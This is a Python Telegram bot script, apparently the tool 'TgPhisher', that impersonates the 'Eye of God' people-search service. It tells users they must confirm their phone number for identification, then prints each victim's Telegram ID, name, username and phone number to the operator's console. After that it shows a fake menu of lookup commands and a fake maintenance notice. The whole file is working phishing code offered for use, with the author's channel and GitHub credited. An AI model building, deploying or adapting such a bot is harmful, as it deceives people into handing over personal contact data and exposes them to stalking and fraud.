import telebot
import os
import requests
from telebot import types
import colorama
from colorama import init, Fore, Style, Back

init()

# Определение цветов
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT
def print_user_data(user_id, first_name, username=None, phone_number=None):
    border = "{:-^40}".format("")
    
    print(Fore.YELLOW + border + Style.RESET_ALL)
    print(Fore.GREEN + "    ID: " + Fore.WHITE + "{:<31}".format(user_id) + Style.RESET_ALL)
    print(Fore.GREEN + "    Имя: " + Fore.WHITE + "{:<29}".format(first_name) + Style.RESET_ALL)
    
    if username:
        print(Fore.GREEN + "    Username: " + Fore.WHITE + "{:<24}".format("@" + username) + Style.RESET_ALL)
    if phone_number:
        print(Fore.GREEN + "    Номер телефона: " + Fore.WHITE + "     {:<14}".format("+" + phone_number) + Style.RESET_ALL)
    print(Fore.YELLOW + border + Style.RESET_ALL)


os.system('cls' if os.name == 'nt' else 'clear')
print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
                    .:ГЛАЗ БОГА:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CyberStalker1337
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')
def is_valid_token(token):

    try:
        bot = telebot.TeleBot(token)
        bot_info = bot.get_me()
        if bot_info:
            return True
    except telebot.apihelper.ApiException:
        return False

token = input(f"     {blue}Введите токен вашего бота >> ")

if not is_valid_token(token):
    print("{reset}     Неверный токен! Пожалуйста, повторите запуск скрипта")

else:
    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
    
    # Проверяем, что запрос успешно выполнен и содержит имя пользователя
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    username = get_bot_username(token)
    if username:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
                    .:ГЛАЗ БОГА:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CyberStalker1337
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')
        print(f"        Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        Юзернейм вашего бота: {yellow}@{username}")
    else:
        print(f"\n     Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}")
    bot = telebot.TeleBot(token)
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_phone = types.KeyboardButton(text="Подтвердить номер телефона", request_contact=True)
        markup.add(button_phone)
    
        bot.send_message(message.chat.id, """
🗂 <b>Номер телефона</b>

Вам необходимо подтвердить <b>номер телефона</b> для того, чтобы завершить <b>идентификацию</b>.

Для этого нажмите кнопку ниже.""", parse_mode="HTML", reply_markup=markup)

    @bot.message_handler(content_types=['contact'])
    def contact_handler(message):
        if message.contact is not None:
            if message.contact.user_id == message.from_user.id:
                markup = types.ReplyKeyboardRemove()
                bot.send_message(message.chat.id, f'''
⬇️ **Примеры команд для ввода:**

👤 **Поиск по имени**
├  `Блогер` (Поиск по тегу)
├  `Антипов Евгений Вячеславович`
└  `Антипов Евгений Вячеславович 05.02.1994`
 (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

🚗 **Поиск по авто**
├  `Н777ОН777` - поиск авто по РФ
└  `WDB4632761X337915` - поиск по VIN

👨 **Социальные сети**
├  `instagram.com/ev.antipov` - Instagram
├  `vk.com/id577744097` - Вконтакте
├  `facebook.com/profile.php?id=1` - Facebook
└  `ok.ru/profile/162853188164` - Одноклассники

📱 `79999939919` - для поиска по номеру телефона
📨 `tema@gmail.com` - для поиска по Email
📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

🏛 `/company Сбербанк` - поиск по юр лицам
📑 `/inn 784806113663` - поиск по ИНН
🎫 `/snils 13046964250` - поиск по СНИЛС
📇 `/passport 6113825395` - поиск по паспорту
🗂 `/vy 9902371011` - поиск по ВУ

📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
🙂 Отправьте стикер, чтобы найти создателя.
🌎 Отправьте точку на карте, чтобы найти информацию.
🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

''', parse_mode="Markdown", reply_markup=markup)
                print()
                print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
                print()
            else:
                    bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")

    @bot.message_handler(func=lambda message: True)
    def default_handler(message):
        bot.send_message(message.chat.id, f'''
⚠️ **Технические работы.**

Работы будут завершены в ближайший промежуток времени, все подписки наших пользователей продлены.
''', parse_mode="Markdown")
  

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Произошла ошибка: {e}")
    